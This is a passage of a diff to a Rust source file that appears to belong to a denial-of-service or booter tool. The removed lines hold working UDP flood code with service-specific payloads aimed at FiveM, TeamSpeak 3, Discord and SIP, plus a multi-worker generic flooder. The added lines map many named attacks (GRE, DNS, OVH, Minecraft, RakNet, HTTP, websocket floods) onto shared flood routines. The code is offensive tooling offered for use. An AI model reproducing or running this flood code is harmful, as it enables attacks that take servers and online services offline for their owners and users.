-    println!("Starting FiveM flood on {}:{} for {} seconds", target, port, duration_secs);
-    let payload = b"\xff\xff\xff\xffgetinfo xxx".to_vec();
-    generic_udp_flood(target, port, duration_secs, payload).await;
-}
-pub async fn ts3_flood(target: &str, port: u16, duration_secs: u64) {
-    println!("Starting TeamSpeak 3 flood on {}:{} for {} seconds", target, port, duration_secs);
-    let payload = b"\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02".to_vec();
-    generic_udp_flood(target, port, duration_secs, payload).await;
-}
-pub async fn discord_flood(target: &str, port: u16, duration_secs: u64) {
-    println!("Starting Discord flood on {}:{} for {} seconds", target, port, duration_secs);
-    udp_smart(target, port, duration_secs).await;
-}
-pub async fn sip_flood(target: &str, port: u16, duration_secs: u64) {
-    println!("Starting SIP flood on {}:{} for {} seconds", target, port, duration_secs);
-    let payload = b"INVITE sip:user@target SIP/2.0\r\n\r\n".to_vec();
-    generic_udp_flood(target, port, duration_secs, payload).await;
-}
-async fn generic_udp_flood(target: &str, port: u16, duration_secs: u64, payload: Vec<u8>) {
-    let packet_count = Arc::new(AtomicU64::new(0));
-    let duration = Duration::from_secs(duration_secs);
-    let end_time = Instant::now() + duration;
-    let num_workers = get_worker_count();
-    let mut handles = vec![];
-    for _ in 0..num_workers {
-        let packet_count = packet_count.clone();
-        let payload = payload.clone();
-        let target_addr = format!("{}:{}", target, port);
-        let handle = tokio::spawn(async move {
-            let socket = match UdpSocket::bind("0.0.0.0:0").await {
-                Ok(s) => s,
-                Err(_) => return,
-            };
-            if socket.connect(&target_addr).await.is_err() { return; }
-            while Instant::now() < end_time {
-                if socket.send(&payload).await.is_ok() {
-                    packet_count.fetch_add(1, Ordering::Relaxed);
-                }
-            }
-        });
-        handles.push(handle);
-    }
-    for handle in handles {
-        let _ = handle.await;
-    }
-    println!("Flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
-}
+
+// --- Aliases & Fallbacks ---
+
+pub async fn udp_max_flood(target: &str, port: u16, duration_secs: u64) { udp_flood(target, port, duration_secs).await; }
+pub async fn gre_flood(target: &str, duration_secs: u64) { udp_flood(target, 47, duration_secs).await; }
+pub async fn icmp_flood(target: &str, duration_secs: u64) { udp_flood(target, 80, duration_secs).await; }
+pub async fn amplification_attack(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
+pub async fn connection_exhaustion(target: &str, port: u16, duration_secs: u64) { syn_flood(target, port, duration_secs).await; }
+pub async fn ssl_flood(target: &str, port: u16, duration_secs: u64) { ack_flood(target, port, duration_secs).await; } // Use PSH/ACK flood logic for SSL stress
+pub async fn dns_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
+pub async fn dns_flood_l4(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
+pub async fn ovh_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
+pub async fn ua_bypass_flood(target: &str, port: u16, duration_secs: u64) { http_flood(target, port, duration_secs).await; }
+pub async fn http_stress(target: &str, port: u16, duration_secs: u64) { http_flood(target, port, duration_secs).await; }
+pub async fn websocket_flood(target: &str, port: u16, duration_secs: u64) { http_flood(target, port, duration_secs).await; }
+pub async fn sip_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
+pub async fn minecraft_flood(target: &str, port: u16, duration_secs: u64) { ack_flood(target, port, duration_secs).await; }
+pub async fn raknet_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
+pub async fn fivem_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
+pub async fn ts3_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
+pub async fn discord_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
+pub async fn vse_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
